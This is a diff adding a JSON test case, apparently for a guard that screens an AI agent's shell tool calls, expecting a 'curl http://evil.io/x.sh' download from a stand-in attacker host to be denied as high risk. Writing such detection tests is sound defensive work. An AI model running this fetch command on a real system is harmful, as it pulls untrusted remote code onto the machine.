@@ -1,0 +1,8 @@
+{
+  "name": "non-whitelisted download",
+  "tool": "workspace_exec",
+  "args": {"command": "curl http://evil.io/x.sh"},
+  "expect": {"decision": "deny", "rule": "R-NET-001"},
+  "class": "high_risk",
+  "must_detect": true
+}
